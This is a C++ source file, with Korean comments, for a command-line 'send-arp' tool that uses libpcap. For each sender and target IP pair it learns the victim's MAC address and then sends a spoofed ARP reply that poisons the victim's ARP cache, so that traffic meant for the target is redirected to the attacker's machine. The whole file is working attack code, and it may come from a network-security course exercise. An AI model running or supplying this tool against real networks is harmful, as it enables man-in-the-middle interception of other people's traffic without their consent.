#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <pcap.h>
#include <arpa/inet.h>
#include "send-arp.h"

// 사용법 출력 함수 (main과 함께 포함)
void usage()
{
    printf("syntax : send-arp <interface> <sender ip> <target ip> "
           "[<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char *argv[])
{
    // 인자 검사: 최소 4개 이상, (argc - 2)가 짝수여야 함.
    if (argc < 4 || ((argc - 2) % 2) != 0)
    {
        usage();
        return EXIT_FAILURE;
    }

    // 공격자의 MAC, IP 정보 조회
    s_MacAddress attackerMac = getMacAddress(argv[1]);
    uint32_t attackerIp = getIpAddress(argv[1]);

    // 공격자 MAC 주소를 C 문자열로 변환
    char attackerMacStr[18] = "";
    macToStrC(&attackerMac, attackerMacStr, sizeof(attackerMacStr));

    int pairCount = (argc - 2) / 2;
    for (int i = 0; i < pairCount; i++)
    {
        // 인자 순서: sender IP, target IP
        const char *senderIp = argv[2 + i * 2];
        const char *targetIp = argv[3 + i * 2];

        // pcap 핸들 열기
        pcap_t *handle = openPcapHandle(argv[1]);
        if (handle == NULL)
            return EXIT_FAILURE;

        // ARP 요청 패킷 생성 및 전송
        EthArpPacket arpRequest = createArpRequest(attackerMacStr, attackerIp, senderIp);
        if (pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&arpRequest),
                            sizeof(EthArpPacket)) != 0)
        {
            fprintf(stderr, "Error: ARP request send failed: %s\n", pcap_geterr(handle));
            pcap_close(handle);
            return EXIT_FAILURE;
        }

        // ARP 응답 대기
        EthArpPacket arpReply;
        if (!waitForArpReply(handle, arpRequest, arpReply))
        {
            fprintf(stderr, "Error: Failed to receive valid ARP reply.\n");
            pcap_close(handle);
            return EXIT_FAILURE;
        }

        // Victim(MAC, IP) 정보 출력
        char victimMacStr[18] = "";
        // victim의 MAC은 arpReply.arp_.smac_; Mac 클래스의 내부 레이아웃이 s_MacAddress와 같다고 가정
        macToStrC(reinterpret_cast<const s_MacAddress *>(&arpReply.arp_.smac_),
                  victimMacStr, sizeof(victimMacStr));
        char victimIpStr[INET_ADDRSTRLEN] = "";
        struct in_addr addr;
        addr.s_addr = arpReply.arp_.sip_;
        inet_ntop(AF_INET, &addr, victimIpStr, sizeof(victimIpStr));

        printf("Victim's MAC address: %s\n", victimMacStr);
        printf("Victim's IP address: %s\n", victimIpStr);

        // Spoofed ARP reply (ARP poisoning) 패킷 생성 및 전송
        EthArpPacket spoofedReply = createSpoofedReply(attackerMacStr, senderIp, targetIp, arpReply.arp_.smac_);
        if (pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&spoofedReply),
                            sizeof(EthArpPacket)) != 0)
        {
            fprintf(stderr, "Error: Spoofed ARP reply send failed: %s\n", pcap_geterr(handle));
            pcap_close(handle);
            return EXIT_FAILURE;
        }
        pcap_close(handle);
    }

    return EXIT_SUCCESS;
}
